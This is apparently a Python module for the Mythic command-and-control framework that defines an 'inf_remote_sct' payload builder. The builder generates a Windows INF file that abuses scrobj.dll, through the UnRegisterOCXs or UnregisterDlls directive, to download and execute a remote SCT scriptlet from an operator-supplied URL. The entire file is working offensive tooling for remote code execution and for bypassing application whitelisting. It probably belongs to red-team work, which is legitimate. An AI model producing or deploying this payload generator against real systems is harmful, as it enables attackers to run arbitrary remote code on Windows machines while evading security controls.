import logging
import pathlib
import traceback
from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json
import os
import shutil
import base64
import random

class inf_remote_sct(PayloadType):
    name = "inf_remote_sct"
    file_extension = "inf"
    author = "@hegusung"
    supported_os = [SupportedOS.Windows]
    wrapper = True
    wrapped_payloads = ["sct_remote_script", "sct_wraps_script"]
    note = """Creates a INF payload which will download and execute a SCT payload"""
    supports_dynamic_loading = True
    c2_profiles = []
    mythic_encrypts = True
    translation_container = None # "myPythonTranslation"
    agent_path = pathlib.Path(".") / "file"
    agent_icon_path = agent_path / "agent_functions" / "file.svg"
    agent_code_path = agent_path / "agent_code"
    build_parameters = [
        BuildParameter(
            name = "url",
            parameter_type=BuildParameterType.String,
            description="Payload URL",
        ),
        BuildParameter(
            name = "defaultinstall_name",
            parameter_type=BuildParameterType.String,
            default_value="",
            description="Default install name, view documentation for specifics",
        ),
        BuildParameter(
            name = "section_name",
            parameter_type=BuildParameterType.String,
            default_value="Section",
            description="Section name",
        ),
        BuildParameter(
            name = "method",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["UnRegisterOCXs", "UnregisterDlls"],
            default_value="UnRegisterOCXs",
            description="Method to use to execute the remote SCT script, view documentation for specifics",
        ),
        BuildParameter(
            name = "service",
            parameter_type=BuildParameterType.String,
            default_value="",
            description="Service Name",
        ),
    ]

    build_steps = [
    ]

    async def build(self) -> BuildResponse:
        # this function gets called to create an instance of your payload
        resp = BuildResponse(status=BuildStatus.Success)
        # create the payload
        build_msg = ""

        try:

            url = self.get_parameter('url')
            defaultinstall_name = self.get_parameter('defaultinstall_name')
            section = self.get_parameter('section_name')
            method = self.get_parameter('method')
            service = self.get_parameter('service')

            payload = """[version]
Signature=$chicago$
AdvancedINF=2.5

[{defaultinstall}]
{method}={section}

[{section}]
"""
            if method == "UnRegisterOCXs":
                payload += """%11%\scrobj.dll,NI,{url}

"""
            elif method == "UnregisterDlls":
                payload += """11,,scrobj.dll,2,60,{url}

"""
            else:
                resp.set_status(BuildStatus.Error)
                resp.build_stderr = "Unknown method " + str(method)
                return resp


            if len(service) != 0:
                payload += """[Strings]
AppAct = "SOFTWARE\Microsoft\Connection Manager"
ServiceName="{service}"
ShortSvcName="{service}" """

            resp.payload = payload.format(defaultinstall=defaultinstall_name, method=method, section=section, url=url, service=service)
            resp.build_message = "Successfully built!\n"

        except Exception as e:
            traceback.print_exc()

            resp.set_status(BuildStatus.Error)
            resp.build_stderr = "Error building payload: " + str(e)
        return resp
